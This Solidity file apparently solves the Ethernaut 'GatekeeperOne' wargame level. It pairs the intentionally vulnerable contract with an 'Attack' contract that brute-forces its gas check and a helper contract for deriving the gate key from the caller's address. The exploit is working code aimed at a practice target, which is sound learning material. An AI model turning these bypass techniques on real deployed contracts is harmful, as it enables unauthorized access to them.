// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "One");
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0, "Two");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract Attack {
    GatekeeperOne public gatekeeperOne;
  

    constructor(address _gatekeeperOne) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOne);
    }

    function callEnter(bytes8 _gateKey) external {
        for(uint i = 0; i < 500; i++) {
          uint256 totalGas = i + (8191 * 5);

          (bool result, ) = address(gatekeeperOne).call{gas: totalGas}(
              abi.encodeWithSignature("enter(bytes8)", _gateKey)
          );

          if(result) {
                break;
          }
        }
    }
    
}

//24996
//9577, 423

contract Converter {
    uint64 public _uint = 56772;

    function toUint16(address _addr) public pure returns(uint16) {
        return uint16(uint160(_addr));
    }

    function toUint64Byte(bytes8 _uint64) public pure returns(uint64) {
      return uint64(_uint64);
    }

    function toUint116(uint64 _val) public pure returns(bytes8) {
        return bytes8(uint64(_val));
    }

    function uint32_uint64_gateKey(bytes8 _bytes8) public pure returns(uint32) {
      return uint32(uint64(_bytes8));
    }

    function uint64_bytes8(bytes8 _bytes8) public pure returns(uint64) {
      return uint64(_bytes8);
    }
    // modifier gateThree(bytes8 _gateKey) {
    //   require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    //   require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    //   require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    // _;
}


